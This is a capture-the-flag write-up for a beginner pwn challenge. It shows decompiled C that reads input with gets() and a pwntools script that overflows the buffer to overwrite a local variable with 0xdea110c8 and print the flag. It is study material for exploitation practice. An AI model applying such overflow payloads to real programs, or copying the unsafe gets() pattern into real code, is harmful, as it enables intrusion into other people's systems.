## Solution 

```Cundefined4 main(void)

{
  int iVar1;
  char local_43 [43];
  int local_18;
  undefined4 local_14;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  setvbuf(_stdout,(char *)0x2,0,0);
  local_14 = 2;
  local_18 = 0;
  puts(
      "Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other  side he see."
      );
  puts("What... is your name?");
  fgets(local_43,43,_stdin);
  iVar1 = strcmp(local_43,"Sir Lancelot of Camelot\n");
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is your quest?");
  fgets(local_43,0x2b,_stdin);
  iVar1 = strcmp(local_43,"To seek the Holy Grail.\n");
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is my secret?");
  gets(local_43);
  if (local_18 == L'\xdea110c8') {ch
    print_flag();
  }
  else {
    puts("I don\'t know that! Auuuuuuuugh!");
  }
  return 0;
}
```

To print the flag we have to somehow set the local_18 to `\xdea110c8` . We can see that after the first two Inputs as `Sir Lancelot of Camelot` and `To seek the Holy Grail.`
the code takes input in local_43 using `gets` . `gets` is vuln to overflow so we can overwrite till local_18 . We can see the relative addresses in the ghidra decompiled window  
:

![image](https://github.com/fidgetaryan445/NIghtmare/assets/148867576/5fa77b85-0a3f-4683-a19f-d3c3eca0be58)

The offset can clearly be seen of 43. 

So we can craft our payload : 


```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template pwn1
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'pwn1')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

io.recvuntil(b"What... is your name?")
io.send(b"Sir Lancelot of Camelot\n")
io.recvuntil(b"What... is your quest?")
io.send(b"To seek the Holy Grail.\n")
io.recvuntil(b"What... is my secret?")
payload = b'0'*0x2b + p32(0xdea110c8)
# shellcode = asm(shellcraft.sh())
io.send(payload)
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

```

after running `python3 exp.py ` we get :


![image](https://github.com/fidgetaryan445/NIghtmare/assets/148867576/ba173443-bda9-474e-b3cf-2aeafc5b5c8a)
